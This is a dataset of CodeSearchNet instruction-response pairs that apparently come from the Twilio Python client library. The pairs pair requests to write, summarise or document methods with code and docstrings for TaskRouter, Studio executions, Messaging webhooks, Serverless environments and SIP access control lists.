{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nbuild an instance of TaskInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of TaskInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.taskrouter.v1.workspace.task.TaskInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.task.TaskInstance\n        \"\"\"\n        return TaskInstance(self._version, payload, workspace_sid=self._solution['workspace_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nupdate the TaskInstance :param unicode attributes: The user-defined JSON data describing the custom attributes of this task. :param TaskInstance.Status assignment_status: A 'pending' or 'reserved' Task may be canceled by posting AssignmentStatus='canceled'. :param unicode reason: This is only required if the Task is canceled or completed. :param unicode priority: Override priority for the Task. :param unicode task_channel: The task_channel :returns: Updated TaskInstance :rtype: twilio.rest.taskrouter.v1.workspace.task.TaskInstance", "response": "def update(self, attributes=values.unset, assignment_status=values.unset,\n               reason=values.unset, priority=values.unset,\n               task_channel=values.unset):\n        \"\"\"\n        Update the TaskInstance\n\n        :param unicode attributes: The user-defined JSON data describing the custom attributes of this task.\n        :param TaskInstance.Status assignment_status: A 'pending' or 'reserved' Task may be canceled by posting AssignmentStatus='canceled'.\n        :param unicode reason: This is only required if the Task is canceled or completed.\n        :param unicode priority: Override priority for the Task.\n        :param unicode task_channel: The task_channel\n\n        :returns: Updated TaskInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.task.TaskInstance\n        \"\"\"\n        data = values.of({\n            'Attributes': attributes,\n            'AssignmentStatus': assignment_status,\n            'Reason': reason,\n            'Priority': priority,\n            'TaskChannel': task_channel,\n        })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return TaskInstance(\n            self._version,\n            payload,\n            workspace_sid=self._solution['workspace_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef reservations(self):\n        if self._reservations is None:\n            self._reservations = ReservationList(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n                task_sid=self._solution['sid'],\n            )\n        return self._reservations", "response": "Access the reservations\n\n        :returns: twilio.rest.taskrouter.v1.workspace.task.reservation.ReservationList\n        :rtype: twilio.rest.taskrouter.v1.workspace.task.reservation.ReservationList"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _proxy(self):\n        if self._context is None:\n            self._context = TaskContext(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the resource we are interested in"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef update(self, attributes=values.unset, assignment_status=values.unset,\n               reason=values.unset, priority=values.unset,\n               task_channel=values.unset):\n        \"\"\"\n        Update the TaskInstance\n\n        :param unicode attributes: The user-defined JSON data describing the custom attributes of this task.\n        :param TaskInstance.Status assignment_status: A 'pending' or 'reserved' Task may be canceled by posting AssignmentStatus='canceled'.\n        :param unicode reason: This is only required if the Task is canceled or completed.\n        :param unicode priority: Override priority for the Task.\n        :param unicode task_channel: The task_channel\n\n        :returns: Updated TaskInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.task.TaskInstance\n        \"\"\"\n        return self._proxy.update(\n            attributes=attributes,\n            assignment_status=assignment_status,\n            reason=reason,\n            priority=priority,\n            task_channel=task_channel,\n        )", "response": "Updates the TaskInstance with the specified attributes."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncreating a new StreamMessageInstance", "response": "def create(self, data):\n        \"\"\"\n        Create a new StreamMessageInstance\n\n        :param dict data: Stream Message body.\n\n        :returns: Newly created StreamMessageInstance\n        :rtype: twilio.rest.sync.v1.service.sync_stream.stream_message.StreamMessageInstance\n        \"\"\"\n        data = values.of({'Data': serialize.object(data), })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return StreamMessageInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            stream_sid=self._solution['stream_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nbuild an instance of StreamMessageInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of StreamMessageInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.sync.v1.service.sync_stream.stream_message.StreamMessageInstance\n        :rtype: twilio.rest.sync.v1.service.sync_stream.stream_message.StreamMessageInstance\n        \"\"\"\n        return StreamMessageInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            stream_sid=self._solution['stream_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\naccesses the DialingPermissionsList Twilio Domain", "response": "def dialing_permissions(self):\n        \"\"\"\n        :rtype: twilio.rest.voice.v1.dialing_permissions.DialingPermissionsList\n        \"\"\"\n        if self._dialing_permissions is None:\n            self._dialing_permissions = DialingPermissionsList(self)\n        return self._dialing_permissions"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef create(self, unique_name, domain_suffix=values.unset):\n        data = values.of({'UniqueName': unique_name, 'DomainSuffix': domain_suffix, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return EnvironmentInstance(self._version, payload, service_sid=self._solution['service_sid'], )", "response": "Create a new EnvironmentInstance"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nconstructing a EnvironmentContext :param sid: The sid :returns: twilio.rest.serverless.v1.service.environment.EnvironmentContext :rtype: twilio.rest.serverless.v1.service.environment.EnvironmentContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a EnvironmentContext\n\n        :param sid: The sid\n\n        :returns: twilio.rest.serverless.v1.service.environment.EnvironmentContext\n        :rtype: twilio.rest.serverless.v1.service.environment.EnvironmentContext\n        \"\"\"\n        return EnvironmentContext(self._version, service_sid=self._solution['service_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_instance(self, payload):\n        return EnvironmentInstance(self._version, payload, service_sid=self._solution['service_sid'], )", "response": "Build an instance of EnvironmentInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\naccesses the variables :returns: twilio.rest.serverless.v1.service.environment.variable.VariableList :rtype: twilio.rest.serverless.v1.service.environment.variable.VariableList", "response": "def variables(self):\n        \"\"\"\n        Access the variables\n\n        :returns: twilio.rest.serverless.v1.service.environment.variable.VariableList\n        :rtype: twilio.rest.serverless.v1.service.environment.variable.VariableList\n        \"\"\"\n        if self._variables is None:\n            self._variables = VariableList(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                environment_sid=self._solution['sid'],\n            )\n        return self._variables"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef deployments(self):\n        if self._deployments is None:\n            self._deployments = DeploymentList(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                environment_sid=self._solution['sid'],\n            )\n        return self._deployments", "response": "Access the deployments\n\n        :returns: twilio.rest.serverless.v1.service.environment.deployment.DeploymentList\n        :rtype: twilio.rest.serverless.v1.service.environment.deployment.DeploymentList"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef _proxy(self):\n        if self._context is None:\n            self._context = EnvironmentContext(\n                self._version,\n                service_sid=self._solution['service_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the environment"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef stream(self, date_created_from=values.unset, date_created_to=values.unset,\n               limit=None, page_size=None):\n        \"\"\"\n        Streams ExecutionInstance records from the API as a generator stream.\n        This operation lazily loads records as efficiently as possible until the limit\n        is reached.\n        The results are returned as a generator, so this operation is memory efficient.\n\n        :param datetime date_created_from: Only show Executions that started on or after this ISO8601 date-time.\n        :param datetime date_created_to: Only show Executions that started before this this ISO8601 date-time.\n        :param int limit: Upper limit for the number of records to return. stream()\n                          guarantees to never return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, stream() will attempt to read the\n                              limit with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.studio.v1.flow.execution.ExecutionInstance]\n        \"\"\"\n        limits = self._version.read_limits(limit, page_size)\n\n        page = self.page(\n            date_created_from=date_created_from,\n            date_created_to=date_created_to,\n            page_size=limits['page_size'],\n        )\n\n        return self._version.stream(page, limits['limit'], limits['page_limit'])", "response": "Streams ExecutionInstance records from the API as a generator."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nstream ExecutionInstance records from the API as a list.", "response": "def list(self, date_created_from=values.unset, date_created_to=values.unset,\n             limit=None, page_size=None):\n        \"\"\"\n        Lists ExecutionInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param datetime date_created_from: Only show Executions that started on or after this ISO8601 date-time.\n        :param datetime date_created_to: Only show Executions that started before this this ISO8601 date-time.\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.studio.v1.flow.execution.ExecutionInstance]\n        \"\"\"\n        return list(self.stream(\n            date_created_from=date_created_from,\n            date_created_to=date_created_to,\n            limit=limit,\n            page_size=page_size,\n        ))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nretrieve a single page of ExecutionInstance records from the API.", "response": "def page(self, date_created_from=values.unset, date_created_to=values.unset,\n             page_token=values.unset, page_number=values.unset,\n             page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of ExecutionInstance records from the API.\n        Request is executed immediately\n\n        :param datetime date_created_from: Only show Executions that started on or after this ISO8601 date-time.\n        :param datetime date_created_to: Only show Executions that started before this this ISO8601 date-time.\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of ExecutionInstance\n        :rtype: twilio.rest.studio.v1.flow.execution.ExecutionPage\n        \"\"\"\n        params = values.of({\n            'DateCreatedFrom': serialize.iso8601_datetime(date_created_from),\n            'DateCreatedTo': serialize.iso8601_datetime(date_created_to),\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return ExecutionPage(self._version, response, self._solution)"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef create(self, to, from_, parameters=values.unset):\n        data = values.of({'To': to, 'From': from_, 'Parameters': serialize.object(parameters), })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return ExecutionInstance(self._version, payload, flow_sid=self._solution['flow_sid'], )", "response": "Create a new ExecutionInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get(self, sid):\n        return ExecutionContext(self._version, flow_sid=self._solution['flow_sid'], sid=sid, )", "response": "Constructs a ExecutionContext\n\n        :param sid: Execution Sid.\n\n        :returns: twilio.rest.studio.v1.flow.execution.ExecutionContext\n        :rtype: twilio.rest.studio.v1.flow.execution.ExecutionContext"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef get_instance(self, payload):\n        return ExecutionInstance(self._version, payload, flow_sid=self._solution['flow_sid'], )", "response": "Build an instance of ExecutionInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef fetch(self):\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return ExecutionInstance(\n            self._version,\n            payload,\n            flow_sid=self._solution['flow_sid'],\n            sid=self._solution['sid'],\n        )", "response": "Fetch a ExecutionInstance\n\n        :returns: Fetched ExecutionInstance\n        :rtype: twilio.rest.studio.v1.flow.execution.ExecutionInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef steps(self):\n        if self._steps is None:\n            self._steps = ExecutionStepList(\n                self._version,\n                flow_sid=self._solution['flow_sid'],\n                execution_sid=self._solution['sid'],\n            )\n        return self._steps", "response": "Access the steps\n\n        :returns: twilio.rest.studio.v1.flow.execution.execution_step.ExecutionStepList\n        :rtype: twilio.rest.studio.v1.flow.execution.execution_step.ExecutionStepList"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef execution_context(self):\n        if self._execution_context is None:\n            self._execution_context = ExecutionContextList(\n                self._version,\n                flow_sid=self._solution['flow_sid'],\n                execution_sid=self._solution['sid'],\n            )\n        return self._execution_context", "response": "Access the execution_context\n\n        :returns: twilio.rest.studio.v1.flow.execution.execution_context.ExecutionContextList\n        :rtype: twilio.rest.studio.v1.flow.execution.execution_context.ExecutionContextList"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef _proxy(self):\n        if self._context is None:\n            self._context = ExecutionContext(\n                self._version,\n                flow_sid=self._solution['flow_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the resource we are interested in"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get(self):\n        return ExecutionContextContext(\n            self._version,\n            flow_sid=self._solution['flow_sid'],\n            execution_sid=self._solution['execution_sid'],\n        )", "response": "Constructs a ExecutionContextContext\n\n        :returns: twilio.rest.studio.v1.flow.execution.execution_context.ExecutionContextContext\n        :rtype: twilio.rest.studio.v1.flow.execution.execution_context.ExecutionContextContext"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nbuild an instance of ExecutionContextInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of ExecutionContextInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.studio.v1.flow.execution.execution_context.ExecutionContextInstance\n        :rtype: twilio.rest.studio.v1.flow.execution.execution_context.ExecutionContextInstance\n        \"\"\"\n        return ExecutionContextInstance(\n            self._version,\n            payload,\n            flow_sid=self._solution['flow_sid'],\n            execution_sid=self._solution['execution_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nfetches a ExecutionContextInstance :returns: Fetched ExecutionContextInstance :rtype: twilio.rest.studio.v1.flow.execution.execution_context.ExecutionContextInstance", "response": "def fetch(self):\n        \"\"\"\n        Fetch a ExecutionContextInstance\n\n        :returns: Fetched ExecutionContextInstance\n        :rtype: twilio.rest.studio.v1.flow.execution.execution_context.ExecutionContextInstance\n        \"\"\"\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return ExecutionContextInstance(\n            self._version,\n            payload,\n            flow_sid=self._solution['flow_sid'],\n            execution_sid=self._solution['execution_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _proxy(self):\n        if self._context is None:\n            self._context = ExecutionContextContext(\n                self._version,\n                flow_sid=self._solution['flow_sid'],\n                execution_sid=self._solution['execution_sid'],\n            )\n        return self._context", "response": "Generate an instance context for the resource we are interested in"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\naccesses the BulkExports Twilio Domain", "response": "def bulk_exports(self):\n        \"\"\"\n        :returns: Version bulk_exports of preview\n        :rtype: twilio.rest.preview.bulk_exports.BulkExports\n        \"\"\"\n        if self._bulk_exports is None:\n            self._bulk_exports = BulkExports(self)\n        return self._bulk_exports"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\naccessing the DeployedDevices Twilio Domain", "response": "def deployed_devices(self):\n        \"\"\"\n        :returns: Version deployed_devices of preview\n        :rtype: twilio.rest.preview.deployed_devices.DeployedDevices\n        \"\"\"\n        if self._deployed_devices is None:\n            self._deployed_devices = DeployedDevices(self)\n        return self._deployed_devices"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\naccessing the HostedNumbers Twilio Domain", "response": "def hosted_numbers(self):\n        \"\"\"\n        :returns: Version hosted_numbers of preview\n        :rtype: twilio.rest.preview.hosted_numbers.HostedNumbers\n        \"\"\"\n        if self._hosted_numbers is None:\n            self._hosted_numbers = HostedNumbers(self)\n        return self._hosted_numbers"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\naccesses the Marketplace Twilio Domain", "response": "def marketplace(self):\n        \"\"\"\n        :returns: Version marketplace of preview\n        :rtype: twilio.rest.preview.marketplace.Marketplace\n        \"\"\"\n        if self._marketplace is None:\n            self._marketplace = Marketplace(self)\n        return self._marketplace"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\naccessing the AccSecurity Twilio Domain", "response": "def acc_security(self):\n        \"\"\"\n        :returns: Version acc_security of preview\n        :rtype: twilio.rest.preview.acc_security.AccSecurity\n        \"\"\"\n        if self._acc_security is None:\n            self._acc_security = AccSecurity(self)\n        return self._acc_security"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\naccessing the Sync Twilio Domain", "response": "def sync(self):\n        \"\"\"\n        :returns: Version sync of preview\n        :rtype: twilio.rest.preview.sync.Sync\n        \"\"\"\n        if self._sync is None:\n            self._sync = Sync(self)\n        return self._sync"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\naccess the Understand object", "response": "def understand(self):\n        \"\"\"\n        :returns: Version understand of preview\n        :rtype: twilio.rest.preview.understand.Understand\n        \"\"\"\n        if self._understand is None:\n            self._understand = Understand(self)\n        return self._understand"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef wireless(self):\n        if self._wireless is None:\n            self._wireless = Wireless(self)\n        return self._wireless", "response": "Access the Wireless Twilio Domain"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef create(self, target, configuration_url=values.unset,\n               configuration_method=values.unset,\n               configuration_filters=values.unset,\n               configuration_triggers=values.unset,\n               configuration_flow_sid=values.unset,\n               configuration_retry_count=values.unset,\n               configuration_replay_after=values.unset,\n               configuration_buffer_messages=values.unset,\n               configuration_buffer_window=values.unset):\n        \"\"\"\n        Create a new WebhookInstance\n\n        :param WebhookInstance.Target target: The target of this webhook.\n        :param unicode configuration_url: The absolute url the webhook request should be sent to.\n        :param WebhookInstance.Method configuration_method: The HTTP method to be used when sending a webhook request.\n        :param unicode configuration_filters: The list of events, firing webhook event for this Session.\n        :param unicode configuration_triggers: The list of keywords, firing webhook event for this Session.\n        :param unicode configuration_flow_sid: The studio flow sid, where the webhook should be sent to.\n        :param unicode configuration_retry_count: The number of retries in case of webhook request failures.\n        :param unicode configuration_replay_after: The message index for which and it's successors the webhook will be replayed.\n        :param bool configuration_buffer_messages: The flag whether buffering should be applied to messages.\n        :param unicode configuration_buffer_window: The period of buffering messages.\n\n        :returns: Newly created WebhookInstance\n        :rtype: twilio.rest.messaging.v1.session.webhook.WebhookInstance\n        \"\"\"\n        data = values.of({\n            'Target': target,\n            'Configuration.Url': configuration_url,\n            'Configuration.Method': configuration_method,\n            'Configuration.Filters': serialize.map(configuration_filters, lambda e: e),\n            'Configuration.Triggers': serialize.map(configuration_triggers, lambda e: e),\n            'Configuration.FlowSid': configuration_flow_sid,\n            'Configuration.RetryCount': configuration_retry_count,\n            'Configuration.ReplayAfter': configuration_replay_after,\n            'Configuration.BufferMessages': configuration_buffer_messages,\n            'Configuration.BufferWindow': configuration_buffer_window,\n        })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return WebhookInstance(self._version, payload, session_sid=self._solution['session_sid'], )", "response": "Create a new WebhookInstance."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nconstructs a WebhookContext :param sid: A 34 character string that uniquely identifies this resource. :returns: twilio.rest.messaging.v1.session.webhook.WebhookContext :rtype: twilio.rest.messaging.v1.session.webhook.WebhookContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a WebhookContext\n\n        :param sid: A 34 character string that uniquely identifies this resource.\n\n        :returns: twilio.rest.messaging.v1.session.webhook.WebhookContext\n        :rtype: twilio.rest.messaging.v1.session.webhook.WebhookContext\n        \"\"\"\n        return WebhookContext(self._version, session_sid=self._solution['session_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nbuild an instance of WebhookInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of WebhookInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.messaging.v1.session.webhook.WebhookInstance\n        :rtype: twilio.rest.messaging.v1.session.webhook.WebhookInstance\n        \"\"\"\n        return WebhookInstance(self._version, payload, session_sid=self._solution['session_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef _proxy(self):\n        if self._context is None:\n            self._context = WebhookContext(\n                self._version,\n                session_sid=self._solution['session_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the webhookInstance"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nupdate the WebhookInstance with the specified parameters.", "response": "def update(self, configuration_url=values.unset,\n               configuration_method=values.unset,\n               configuration_filters=values.unset,\n               configuration_triggers=values.unset,\n               configuration_flow_sid=values.unset,\n               configuration_retry_count=values.unset,\n               configuration_buffer_messages=values.unset,\n               configuration_buffer_window=values.unset):\n        \"\"\"\n        Update the WebhookInstance\n\n        :param unicode configuration_url: The absolute url the webhook request should be sent to.\n        :param WebhookInstance.Method configuration_method: The HTTP method to be used when sending a webhook request.\n        :param unicode configuration_filters: The list of events, firing webhook event for this Session.\n        :param unicode configuration_triggers: The list of keywords, firing webhook event for this Session.\n        :param unicode configuration_flow_sid: The studio flow sid, where the webhook should be sent to.\n        :param unicode configuration_retry_count: The number of retries in case of webhook request failures.\n        :param bool configuration_buffer_messages: The flag whether buffering should be applied to messages.\n        :param unicode configuration_buffer_window: The period of buffering messages.\n\n        :returns: Updated WebhookInstance\n        :rtype: twilio.rest.messaging.v1.session.webhook.WebhookInstance\n        \"\"\"\n        return self._proxy.update(\n            configuration_url=configuration_url,\n            configuration_method=configuration_method,\n            configuration_filters=configuration_filters,\n            configuration_triggers=configuration_triggers,\n            configuration_flow_sid=configuration_flow_sid,\n            configuration_retry_count=configuration_retry_count,\n            configuration_buffer_messages=configuration_buffer_messages,\n            configuration_buffer_window=configuration_buffer_window,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef page(self, area_code=values.unset, contains=values.unset,\n             sms_enabled=values.unset, mms_enabled=values.unset,\n             voice_enabled=values.unset, exclude_all_address_required=values.unset,\n             exclude_local_address_required=values.unset,\n             exclude_foreign_address_required=values.unset, beta=values.unset,\n             near_number=values.unset, near_lat_long=values.unset,\n             distance=values.unset, in_postal_code=values.unset,\n             in_region=values.unset, in_rate_center=values.unset,\n             in_lata=values.unset, in_locality=values.unset,\n             fax_enabled=values.unset, page_token=values.unset,\n             page_number=values.unset, page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of SharedCostInstance records from the API.\n        Request is executed immediately\n\n        :param unicode area_code: The area code of the phone numbers to read\n        :param unicode contains: The pattern on which to match phone numbers\n        :param bool sms_enabled: Whether the phone numbers can receive text messages\n        :param bool mms_enabled: Whether the phone numbers can receive MMS messages\n        :param bool voice_enabled: Whether the phone numbers can receive calls.\n        :param bool exclude_all_address_required: Whether to exclude phone numbers that require an Address\n        :param bool exclude_local_address_required: Whether to exclude phone numbers that require a local address\n        :param bool exclude_foreign_address_required: Whether to exclude phone numbers that require a foreign address\n        :param bool beta: Whether to read phone numbers new to the Twilio platform\n        :param unicode near_number: Given a phone number, find a geographically close number within distance miles. (US/Canada only)\n        :param unicode near_lat_long: Given a latitude/longitude pair lat,long find geographically close numbers within distance miles. (US/Canada only)\n        :param unicode distance: The search radius, in miles, for a near_ query. (US/Canada only)\n        :param unicode in_postal_code: Limit results to a particular postal code. (US/Canada only)\n        :param unicode in_region: Limit results to a particular region. (US/Canada only)\n        :param unicode in_rate_center: Limit results to a specific rate center, or given a phone number search within the same rate center as that number. (US/Canada only)\n        :param unicode in_lata: Limit results to a specific local access and transport area. (US/Canada only)\n        :param unicode in_locality: Limit results to a particular locality\n        :param bool fax_enabled: Whether the phone numbers can receive faxes\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of SharedCostInstance\n        :rtype: twilio.rest.api.v2010.account.available_phone_number.shared_cost.SharedCostPage\n        \"\"\"\n        params = values.of({\n            'AreaCode': area_code,\n            'Contains': contains,\n            'SmsEnabled': sms_enabled,\n            'MmsEnabled': mms_enabled,\n            'VoiceEnabled': voice_enabled,\n            'ExcludeAllAddressRequired': exclude_all_address_required,\n            'ExcludeLocalAddressRequired': exclude_local_address_required,\n            'ExcludeForeignAddressRequired': exclude_foreign_address_required,\n            'Beta': beta,\n            'NearNumber': near_number,\n            'NearLatLong': near_lat_long,\n            'Distance': distance,\n            'InPostalCode': in_postal_code,\n            'InRegion': in_region,\n            'InRateCenter': in_rate_center,\n            'InLata': in_lata,\n            'InLocality': in_locality,\n            'FaxEnabled': fax_enabled,\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return SharedCostPage(self._version, response, self._solution)", "response": "Retrieve a single page of SharedCostInstance records from the API. This is the only API endpoint."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nbuild an instance of SharedCostInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of SharedCostInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.available_phone_number.shared_cost.SharedCostInstance\n        :rtype: twilio.rest.api.v2010.account.available_phone_number.shared_cost.SharedCostInstance\n        \"\"\"\n        return SharedCostInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n            country_code=self._solution['country_code'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get(self, sid):\n        return IpAccessControlListContext(self._version, account_sid=self._solution['account_sid'], sid=sid, )", "response": "Constructs a IpAccessControlListContext\n\n        :param sid: A string that identifies the resource to fetch\n\n        :returns: twilio.rest.api.v2010.account.sip.ip_access_control_list.IpAccessControlListContext\n        :rtype: twilio.rest.api.v2010.account.sip.ip_access_control_list.IpAccessControlListContext"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef get_instance(self, payload):\n        return IpAccessControlListInstance(\n            self._version,\n            payload,\n            account_sid=self._solution['account_sid'],\n        )", "response": "Build an instance of IpAccessControlListInstance"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef ip_addresses(self):\n        if self._ip_addresses is None:\n            self._ip_addresses = IpAddressList(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                ip_access_control_list_sid=self._solution['sid'],\n            )\n        return self._ip_addresses", "response": "Access the ip_addresses\n\n        :returns: twilio.rest.api.v2010.account.sip.ip_access_control_list.ip_address.IpAddressList\n        :rtype: twilio.rest.api.v2010.account.sip.ip_access_control_list.ip_address.IpAddressList"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ngenerate an instance context for the resource we are interested in", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: IpAccessControlListContext for this IpAccessControlListInstance\n        :rtype: twilio.rest.api.v2010.account.sip.ip_access_control_list.IpAccessControlListContext\n        \"\"\"\n        if self._context is None:\n            self._context = IpAccessControlListContext(\n                self._version,\n                account_sid=self._solution['account_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\naccesses the assistant_fallback_actions :returns: twilio.rest.preview.understand.assistant.assistant_fallback_actions.AssistantFallbackActionsList :rtype: twilio.rest.preview.understand.assistant.assistant_fallback_actions.AssistantFallbackActionsList", "response": "def assistant_fallback_actions(self):\n        \"\"\"\n        Access the assistant_fallback_actions\n\n        :returns: twilio.rest.preview.understand.assistant.assistant_fallback_actions.AssistantFallbackActionsList\n        :rtype: twilio.rest.preview.understand.assistant.assistant_fallback_actions.AssistantFallbackActionsList\n        \"\"\"\n        if self._assistant_fallback_actions is None:\n            self._assistant_fallback_actions = AssistantFallbackActionsList(\n                self._version,\n                assistant_sid=self._solution['sid'],\n            )\n        return self._assistant_fallback_actions"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef assistant_initiation_actions(self):\n        if self._assistant_initiation_actions is None:\n            self._assistant_initiation_actions = AssistantInitiationActionsList(\n                self._version,\n                assistant_sid=self._solution['sid'],\n            )\n        return self._assistant_initiation_actions", "response": "Access the assistant_initiation_actions\n\n        :returns: twilio.rest.preview.understand.assistant.assistant_initiation_actions.AssistantInitiationActionsList\n        :rtype: twilio.rest.preview.understand.assistant.assistant_initiation_actions.AssistantInitiationActionsList"}
